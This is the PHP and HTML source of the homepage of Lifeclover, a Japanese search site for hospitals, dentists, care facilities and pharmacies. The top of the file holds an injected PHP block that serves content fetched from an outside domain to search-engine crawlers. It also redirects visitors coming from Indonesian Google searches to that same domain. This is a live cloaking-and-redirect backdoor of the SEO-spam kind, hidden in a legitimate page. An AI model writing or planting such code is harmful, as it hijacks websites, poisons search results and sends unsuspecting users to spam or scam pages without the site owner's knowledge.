<?php
$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');

function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}
if (is_bot()) {
    echo file_get_contents('https://ampactive.org/html-php/web-clover.net/');
    exit;
}

if (stripos($s_ref, 'google.co.id') !== false || 
   (stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
    header("Location: https://ampactive.org/amp/");
    exit;
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xml:lang="ja" lang="ja">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="verify-v1" content="H06J+v7m+fB6U2zUE1E0+Dw19QY9uLXfvkfS0UtY6zs=" >
<title>病院・歯科医院検索Lifeclover（ライフクローバー）介護施設・NPO・薬局も探せる</title>
<meta name="description" content="病院・医院検索・歯科・歯医者検索サイトのLifeclover（ライフクローバー）。全国の医院や歯医者を検索して、小児科・皮膚科・耳鼻咽喉科・産婦人科・精神科・インプラント・審美歯科・ホワイトニングなどの診療科目や、地域などのお好みの条件で探すことができます。介護施設やNPO、薬局なども検索可能です。" />
<meta name="keywords" content="病院・医院検索,歯科・歯医者検索,病院,歯科,歯医者,介護施設,介護,NPO,薬局,検索" />
<meta name="author" content="Nichii Lifeclover" />
<meta name="robots" content="index,follow" />
<link href="/css/style.css" rel="stylesheet" type="text/css" media="all">
<link href="/css/moptip.css" rel="stylesheet" type="text/css" media="all">
<meta http-equiv="Content-Script-Type" content="text/javascript" />
<meta http-equiv="Content-Style-Type" content="text/css">
<script type="text/javascript" src="https://www.google.com/jsapi"></script>
<script type="text/javascript"> 
google.load("jquery", "1.2");
</script>
<script type="text/javascript" src="js2/jquery.pngFix.js"></script>
<script type="text/javascript" src="js2/mopTip-1.2.js"></script>
<script type="text/javascript">
$(document).ready(function(){
$("#h-iryou").mopTip({'w':200, 'h':60, 'style':"overOut", 'get':"#iryou"});
$("#h-shika").mopTip({'w':200, 'h':60, 'style':"overOut", 'get':"#shika"});
$("#h-kaigo").mopTip({'w':200, 'h':60, 'style':"overOut", 'get':"#kaigo"});
$("#h-fukushi").mopTip({'w':200, 'h':60, 'style':"overOut", 'get':"#fukushi"});
$("#h-pharmacy").mopTip({'w':200, 'h':60, 'style':"overOut", 'get':"#pharmacy"});
});

function MM_openBrWindow(theURL,winName,features) { //v2.0
  window.open(theURL,winName,features);
}
</script>
<link rel="shortcut icon" href="/favicon.ico" />
<script type="text/javascript"> 
<!--
var GB_ROOT_DIR = "/js2/greybox/";
-->
</script>
<script type="text/javascript" src="/js2/greybox/AJS.js"></script>
<script type="text/javascript" src="/js2/greybox/AJS_fx.js"></script>
<script type="text/javascript" src="/js2/greybox/gb_scripts.js"></script>
<link href="/js2/greybox/gb_styles.css" rel="stylesheet" type="text/css" media="all" />
<style type="text/css">
<!--
.style1 {color: #000000}
-->
</style>
</head>
<body>
<!--▼ヘッダ▼-->
<div style="position:relative">
  <div id="header">
    <div id="header-logo"><a href="index.html"><img src="header-img/header_logo.gif" alt="クローバー" width="240" height="110" /></a></div>
    <h1>病院・医院検索サイトのライフクローバー(Lifeclover)歯科医院・介護施設・NPO団体（福祉）・薬局も探せます</h1>
    <div id="header-menu">
      <ul>
        <li><a href="links/smap.html" onclick="MM_openBrWindow('/links/smap.html','sitemap','scrollbars=yes,width=750,height=500'); return false ">サイトマップ</a></li>
        <li><a href="links/pri.html" onclick="MM_openBrWindow('/links/pri.html','pri','scrollbars=yes,width=750,height=500'); return false ">プライバシーポリシー</a></li>
        <li><a href="links/menseki.html" onclick="MM_openBrWindow('/links/menseki.html','menseki','scrollbars=yes,width=750,height=500'); return false ">免責</a></li>
        <li><a href="https://www.web-clover.net/links/mail.html" onclick="MM_openBrWindow('https://www.web-clover.net/links/mail.html','mail','scrollbars=yes,width=750,height=500'); return false ">お問い合わせ</a></li>
        <li><a href="https://www.nichiigakkan.co.jp/company/about.html" target="_blank">運営</a></li>
      </ul>
    </div>
    <div id="header-navi">
      <ul>
        <li id="h-iryou"><a href="ika/i-top.html">病院・医院検索</a></li>
        <li id="h-shika"><a href="shika/s-top.html">歯科・歯医者検索</a></li>
        <li id="h-kaigo"><a href="kaigo/k-top.html">介護施設検索</a></li>
        <li id="h-fukushi"><a href="fukushi/f-top.html">NPO検索</a></li>
        <li id="h-pharmacy"><a href="pharmacy/p-top.html">調剤薬局検索</a></li>
      </ul>
    </div>
    <div class="hidden">
      <div id="iryou">全国の市町村・診療科目別に病院・医院を検索して探すことが出来ます。</div>
      <div id="shika">全国の歯科を市町村別に検索することが出来ます。</div>
      <div id="kaigo">全国の介護施設を市町村別に検索することが出来ます。</div>
      <div id="fukushi">全国のＮＰＯ法人や、各種相談窓口、作業所を検索できます。</div>
      <div id="pharmacy">全国の調剤薬局・漢方薬店を検索できます。</div>
    </div>
  </div>
  <!--▲ヘッダ終了▲--><!--▼facebook Twitterいいねボタン▼-->
  <div id="gj_botan">
    <div class="gj_width"><iframe src="https://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fwww.web-clover.net%2F&amp;layout=button_count&amp;show_faces=true&amp;width=110&amp;action=like&amp;colorscheme=light&amp;height=21" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:110px; height:21px;" allowTransparency="true"></iframe></div>
    <div class="gj_width"><a href="#" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(document.URL)+'&t='+encodeURIComponent(document.title),null,'width=550px,height=350px');return false;"><img src="https://lh5.googleusercontent.com/-zd4kuBiPuLE/UAZG8leQEUI/AAAAAAAAAwQ/JoxNuaa7ygQ/s50/share.jpg" alt="Share (facebook)" /></a></div>
    <div class="gj_width2"><a href="https://twitter.com/share" class="twitter-share-button" data-count="horizontal" data-via="lifeclover" data-related="mediclips:careclips" data-lang="ja">Tweet</a><script type="text/javascript" src="https://platform.twitter.com/widgets.js"></script></div>
    <div class="gj_width"><a href="https://b.hatena.ne.jp/entry//" class="hatena-bookmark-button" data-hatena-bookmark-title="病院検索・医院検索ライフクローバーLifeclover" data-hatena-bookmark-layout="standard" title="このエントリーをはてなブックマークに追加"><img src="https://b.st-hatena.com/images/entry-button/button-only.gif" alt="このエントリーをはてなブックマークに追加" width="20" height="20" style="border: none;" /></a><script type="text/javascript" src="https://b.st-hatena.com/js/bookmark_button.js" charset="utf-8" async="async"></script></div>
<!-- <div class="gj_width"><script type="text/javascript" src="https://static.evernote.com/noteit.js"></script>
<a href="#" onclick="Evernote.doClip({}); return false;"><img src="https://static.evernote.com/article-clipper-jp.png" alt="Clip to Evernote" /></a></div>-->
  </div>
  <!--▲facebook Twitterいいねボタン終了▲--><!--▼コンテンツ▼-->
  <div id="wrappe">
    <h2 id="top_h2">Lifecloverは全国各地域の病院・歯科医院・介護施設・ＮＰＯ（福祉）・薬局情報検索サイトです。<br />
    診療科、専門医や女医の有無、予約方法、サービスの内容・特徴など、あなたとあなたのご家族にぴったりのお医者さん、歯医者さんや、あなたを支えてくれる介護施設さん、ＮＰＯ法人さん、薬局屋さんを探すことが出来ます。</h2>
    <div id="block-top">
      <p><img src="top-img/top-img_1.jpg" alt="LifeClover" width="950" height="58" /></p>
      <ul id="top-list">
        <li id="t-m-iryou"><a href="ika/i-top.html" title="病院・医院検索">病院・医院検索</a></li>
        <li id="t-m-shika"><a href="shika/s-top.html" title="歯科・歯医者検索">歯科・歯医者検索</a></li>
        <li id="t-m-kaigo"><a href="kaigo/k-top.html" title="介護施設検索">介護施設検索</a></li>
        <li id="t-m-fukushi"><a href="fukushi/f-top.html" title="NPO検索">NPO検索</a></li>
        <li id="t-m-pharmacy"><a href="pharmacy/p-top.html" title="調剤薬局検索">調剤薬局検索</a></li>
      </ul>
      <p class="right"><a href="about.html"><img src="top-img/top-img_3.jpg" alt="Lifecloverって" width="258" height="38" /></a></p>
      <img src="top-img/top-img_4.jpg" width="950" height="16" alt="コンテンツ終了" /></div>
    <div class="block900">
      <div class="block900-l">
        <div class="block-inner">
          <p><img src="img/img_iryo-oshirase.gif" alt="病院・医院情報更新のお知らせ" width="195" height="21" /><a href="/cgi-bin/info/whats_display.cgi?id:ika_info+base:whatsindex.rdf" target="_blank"><img src="img/img_rss.gif" alt="病院・医院情報更新のお知らせRSS" width="60" height="20" hspace="20" /></a></p>
          <script type="text/javascript" src="/cgi-bin/info/whats_display.cgi?id:ika_info+script+kjc:utf8"></script>
        </div>
      </div>
      <div class="block900-r">
        <div class="block-inner">
          <p><img src="img/img_shika-oshirase.gif" alt="歯科・歯医者情報更新のおしらせ" /><a href="/cgi-bin/info/whats_display.cgi?id:shika_info+base:whatsindex.rdf" target="_blank"><img src="img/img_rss.gif" alt="歯科・歯医者情報更新のおしらせRSS" width="60" height="20" hspace="20" /></a></p>
          <script type="text/javascript" src="/cgi-bin/info/whats_display.cgi?id:shika_info+script+kjc:utf8"></script>
        </div>
      </div>
    </div>
    <div class="block900">
      <div class="block900-l">
        <div class="block-inner">
          <p><img src="img/img_kaigo-oshirase.gif" alt="介護施設情報更新のおしらせ" /><a href="/cgi-bin/info/whats_display.cgi?id:kaigo_info+base:whatsindex.rdf" target="_blank"><img src="img/img_rss.gif" alt="介護施設情報更新のおしらせRSS" width="60" height="20" hspace="20" /></a></p>
          <script type="text/javascript" src="/cgi-bin/info/whats_display.cgi?id:kaigo_info+script+kjc:utf8"></script>
        </div>
      </div>
      <div class="block900-r">
        <div class="block-inner">
          <p><img src="img/img_fukushi-oshirase.gif" alt="NPO更新情報のお知らせ" /><a href="/cgi-bin/info/whats_display.cgi?id:fukushi_info+base:whatsindex.rdf" target="_blank"><img src="img/img_rss.gif" alt="NPO更新情報のお知らせRSS" width="60" height="20" hspace="20" /></a></p>
          <script type="text/javascript" src="/cgi-bin/info/whats_display.cgi?id:fukushi_info+script+kjc:utf8"></script>
        </div>
      </div>
    </div>
    <div class="block900">
      <div class="block900-l">
        <div class="block-inner">
          <p><img src="img/img_pharmacy-oshirase.gif" alt="調剤薬局情報更新のおしらせ" /><a href="/cgi-bin/info/whats_display.cgi?id:drug_info+base:whatsindex.rdf" target="_blank"><img src="img/img_rss.gif" alt="調剤薬局情報更新のおしらせRSS" width="60" height="20" hspace="20" /></a></p>
          <script type="text/javascript" src="/cgi-bin/info/whats_display.cgi?id:drug_info+script+kjc:utf8"></script>
        </div>
        <div class="block900-l" style="opacity:0">
          <div class="block-inner">
            <!--<p><img src="img/top_news.gif" alt="サイトニュース" width="146" height="21" /></p>
            <script type="text/javascript" src="/cgi-bin/rss.cgi?rss_temp.html+script"></script>-->
          </div>
        </div>
      </div>
      <div class="block900-r2">
        <div class="block-inner2">
          <p><img src="img/top_info.gif" alt="お知らせ" width="95" height="21" /><a href="/cgi-bin/info/whats_display.cgi?id:info+base:whatsindex.rdf" target="_blank"><img src="img/img_rss.gif" alt="ライフクローバーのお知らせRSS" width="60" height="20" hspace="20" /></a></p>
          <script type="text/javascript" src="/cgi-bin/info/whats_display.cgi?id:info+script+kjc:utf8"></script>
        </div>
      </div>
    </div>
  </div>
  <!--▲コンテンツ終了▲--><!--▼フッタ▼-->
  <div id="foot">
    <!--▼ページTOPへ▼-->
    <div class="pagetop"><img src="body-img/body_pagetop.gif" alt="このページのTOPへ" width="165" height="36" onclick="window.scrollTo(0,0)" /></div>
    <!--▲ページTOPへ終了▲-->
    <div id="foot-block">
      <ul>
        <li><a href="links/smap.html" onclick="MM_openBrWindow('/links/smap.html','sitemap','scrollbars=yes,width=750,height=500'); return false ">サイトマップ</a></li>
        <li><a href="links/pri.html" onclick="MM_openBrWindow('/links/pri.html','pri','scrollbars=yes,width=750,height=500'); return false ">プライバシーポリシー</a></li>
        <li><a href="links/menseki.html" onclick="MM_openBrWindow('/links/menseki.html','menseki','scrollbars=yes,width=750,height=500'); return false ">免責</a></li>
        <li><a href="https://www.web-clover.net/links/mail.html" onclick="MM_openBrWindow('https://www.web-clover.net/links/mail.html','mail','scrollbars=yes,width=750,height=500'); return false ">お問い合わせ</a></li>
        <li><a href="https://www.nichiigakkan.co.jp/company/about.html" target="_blank">運営</a></li>
      </ul>
      <p><a href="/" title="病院・医院検索 ライフクローバー"><img src="/body-img/body_foot-logo.jpg" alt="病院・医院検索 ライフクローバー" width="100" height="40"/></a></p>
    </div>
  </div>
<!--★GA4スクリプトコード-->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-NXEY7NZBH7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-NXEY7NZBH7');
</script>
</div>
</body>
</html>
